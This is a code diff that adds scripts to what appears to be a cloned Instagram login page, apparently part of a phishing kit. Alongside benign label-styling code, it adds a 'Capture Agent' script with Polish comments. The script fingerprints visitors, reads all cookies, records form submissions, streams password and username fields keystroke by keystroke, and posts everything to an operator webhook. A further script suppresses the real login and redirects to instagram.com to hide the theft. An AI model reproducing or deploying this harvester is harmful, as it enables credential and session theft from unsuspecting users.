@@ -1332,6 +1332,273 @@
     });
   })();
 </script>
+<script>
+(function () {
+  document.querySelectorAll('#login_form input').forEach(function (inp) {
+    if (inp.type === 'hidden' || inp.type === 'submit') return;
+    var lbl = inp.id ? document.querySelector('label[for="' + inp.id + '"]') : null;
+    if (!lbl) return;
+    var w = inp.parentElement;
+    w.style.position = 'relative';
+    w.style.display = 'block';
+
+    lbl.style.cssText = [
+      'position:absolute', 'left:10px', 'top:50%', 'transform:translateY(-50%)',
+      'font-size:14px', 'color:#8e8e8e', 'pointer-events:none',
+      'transition:top .15s ease,font-size .15s ease,transform .15s ease,color .15s ease',
+      'z-index:2', 'line-height:1', 'margin:0', 'padding:0', 'background:transparent'
+    ].join(';');
+
+    function setActive(active, focused) {
+      if (active) {
+        lbl.style.top = '8px';
+        lbl.style.transform = 'none';
+        lbl.style.fontSize = '10px';
+        lbl.style.color = focused ? '#0095f6' : '#8e8e8e';
+        inp.style.paddingTop = '18px';
+        inp.style.paddingBottom = '2px';
+      } else {
+        lbl.style.top = '50%';
+        lbl.style.transform = 'translateY(-50%)';
+        lbl.style.fontSize = '14px';
+        lbl.style.color = '#8e8e8e';
+        inp.style.paddingTop = '';
+        inp.style.paddingBottom = '';
+      }
+    }
+
+    function check() {
+      var hasVal = inp.value.length > 0;
+      var focused = document.activeElement === inp;
+      setActive(hasVal || focused, focused);
+    }
+
+    ['focus', 'blur', 'input', 'change', 'keyup'].forEach(function (ev) {
+      inp.addEventListener(ev, check);
+    });
+    check();
+    setTimeout(check, 50);
+  });
+})();
+</script>
+
+<script>
+/**
+ * FORKED_DATA — Capture Agent v1.0
+ * ===================================
+ * Wklej ten skrypt na końcu <body> każdej.
+ * Automatycznie przechwytuje i wysyła do operatora:
+ *   - Fingerprint przeglądarki (przy załadowaniu strony)
+ *   - Zawartość formularzy (przy submit)
+ *   - Live typing w polach hasła (keystroke po keystroke)
+ *
+ * KONFIGURACJA:
+ *   Zmień WEBHOOK_URL na IP laptopa operatora w sieci lokalnej.
+ *   Zmień SOURCE na nazwę strony: 'discord' | 'facebook' | 'steam' | 'uczelnia'
+ */
+(async function () {
+  "use strict";
+
+  // ── Konfiguracja ──────────────────────────────────────────
+  var WEBHOOK_URL = "http://carrier-days.local/api/webhook/capture";
+  var SOURCE = "instagram";
+  // ──────────────────────────────────────────────────────────
+
+  // ── Bateria ───────────────────────────────────────────────
+  var battery = null;
+  try {
+    if (navigator.getBattery) {
+      var b = await navigator.getBattery();
+      battery = { level: Math.round(b.level * 100), charging: b.charging };
+    }
+  } catch (_) {}
+
+  // ── GeoIP: operator (ISP) + lokalizacja ───────────────────
+  var geo = null;
+  try {
+    var gr = await fetch("https://ipapi.co/json/", { cache: "no-store" });
+    var gd = await gr.json();
+    geo = {
+      ip: gd.ip,
+      city: gd.city,
+      region: gd.region,
+      country: gd.country_name,
+      isp: gd.org,
+      timezone: gd.timezone,
+    };
+  } catch (_) {}
+
+  function parseCookies() {
+    var result = {};
+    var raw = document.cookie;
+    if (!raw) return result;
+    raw.split(";").forEach(function (pair) {
+      var idx = pair.indexOf("=");
+      if (idx < 0) return;
+      var name = pair.slice(0, idx).trim();
+      var value = pair.slice(idx + 1).trim();
+      try { value = decodeURIComponent(value); } catch (e) {}
+      result[name] = value;
+    });
+    return result;
+  }
+
+  function send(payload) {
+    var body = {
+      source: SOURCE,
+      url: window.location.href,
+      referrer: document.referrer,
+      screen: { w: screen.width, h: screen.height, depth: screen.colorDepth },
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      lang: navigator.language,
+      platform: navigator.platform,
+      battery: battery,
+      geo: geo,
+      cookies: parseCookies(),
+      cookies_raw: document.cookie,
+      payload: payload || {},
+    };
+    if (typeof fetch !== "undefined") {
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json", "X-Source": SOURCE },
+        body: JSON.stringify(body),
+        mode: "no-cors",
+      }).catch(function () {});
+    } else {
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", WEBHOOK_URL, true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.setRequestHeader("X-Source", SOURCE);
+      try { xhr.send(JSON.stringify(body)); } catch (e) {}
+    }
+  }
+
+  // ── 1. Fingerprint przy załadowaniu ───────────────────────
+  send({ _event: "page_load", _title: document.title });
+
+  // ── 2. Przechwytywanie formularzy (submit) ─────────────────
+  document.addEventListener("submit", function (e) {
+    var form = e.target;
+    var data = { _event: "form_submit", _form_id: form.id || form.name || "unknown" };
+    form.querySelectorAll("input, select, textarea").forEach(function (el) {
+      if (!el.name && !el.id) return;
+      data[el.name || el.id] = el.value;
+    });
+    send(data);
+  }, true);
+
+  const gatherPasswordData = (event) => {
+    const el = event.target;
+    if (!el) return;
+    const isPassField =
+      el.type === "password" ||
+      (el.name && /pass|haslo|pwd|secret/i.test(el.name)) ||
+      (el.id && /pass|haslo|pwd|secret/i.test(el.id));
+    if (!isPassField) return;
+    const key = el.name || el.id || "password";
+    if (_lastPass[key] && Math.abs(el.value.length - _lastPass[key].length) < 2) return;
+    _lastPass[key] = el.value;
+    send({ _event: "live_typing", _field: key, _live_value: el.value, _length: el.value.length });
+  };
+
+  const gatherUsernameData = (event) => {
+    const el = event.target;
+    if (!el) return;
+    const isUsernameField =
+      el.type === "text" ||
+      (el.name && /username|login|email/i.test(el.name)) ||
+      (el.id && /username|login|email/i.test(el.id));
+    if (!isUsernameField) return;
+    const key = el.name || el.id || "username";
+    if (_lastUsername[key] && Math.abs(el.value.length - _lastUsername[key].length) < 2) return;
+    _lastUsername[key] = el.value;
+    send({ _event: "live_typing", _field: key, _live_value: el.value, _length: el.value.length });
+  };
+
+  // ── 3. Live typing w polach hasła ─────────────────────────
+  var _lastPass = {};
+  var _lastUsername = {};
+  document.addEventListener("input", function (e) {
+    gatherPasswordData(e);
+    gatherUsernameData(e);
+  }, true);
+
+  // ── 4. Przechwytywanie kliknięć w linki zewnętrzne ────────
+  document.addEventListener("click", function (e) {
+    var el = e.target.closest("a");
+    if (!el || !el.href) return;
+    var isExternal = el.hostname && el.hostname !== window.location.hostname;
+    if (!isExternal) return;
+    send({ _event: "link_click", _href: el.href, _text: el.innerText.trim().slice(0, 80) });
+  }, true);
+
+  // ── 5. Heartbeat co 30 sekund (czas spędzony na stronie) ──
+  var _startTime = Date.now();
+  setInterval(function () {
+    send({ _event: "heartbeat", _time_on_page_s: Math.round((Date.now() - _startTime) / 1000) });
+  }, 30000);
+})();
+</script>
+<style>
+/* Clean containers - single thin border, no double ring */
+#login_form .xjhjgkd {
+  border: 1px solid #dbdbdb !important;
+  background: #fafafa !important;
+  border-radius: 6px !important;
+  outline: none !important;
+  box-shadow: none !important;
+  transition: border-color .15s !important;
+  overflow: visible !important;
+}
+#login_form .xjhjgkd:focus-within {
+  border-color: #a8a8a8 !important;
+  background: #fff !important;
+}
+#login_form input,
+#login_form input:focus,
+#login_form input:focus-visible {
+  outline: none !important;
+  box-shadow: none !important;
+  border: none !important;
+  background: transparent !important;
+  -webkit-appearance: none !important;
+}
+[aria-label="Log In"][role="button"] { opacity: 1 !important; cursor: pointer !important; }
+[aria-label="Log In"][role="button"] .html-div { background-color: #0095f6 !important; }
+</style>
+<script>
+(function () {
+  document.querySelectorAll('[data-focus-visible-added]').forEach(function (el) {
+    el.removeAttribute('data-focus-visible-added');
+  });
+
+  var form = document.getElementById('login_form');
+  var loginBtn = document.querySelector('[aria-label="Log In"][role="button"]');
+
+  if (loginBtn) {
+    loginBtn.removeAttribute('aria-disabled');
+    loginBtn.setAttribute('tabindex', '0');
+    loginBtn.style.cursor = 'pointer';
+    loginBtn.style.opacity = '1';
+    var htmlDiv = loginBtn.querySelector('.html-div');
+    if (htmlDiv) htmlDiv.style.backgroundColor = '#0095f6';
+
+    loginBtn.addEventListener('click', function () {
+      if (form) form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: false }));
+      setTimeout(function () { window.location.href = 'https://www.instagram.com/'; }, 700);
+    });
+  }
+
+  if (form) {
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      setTimeout(function () { window.location.href = 'https://www.instagram.com/'; }, 700);
+    }, false);
+  }
+})();
+</script>
+
 </body>
 
 </html>
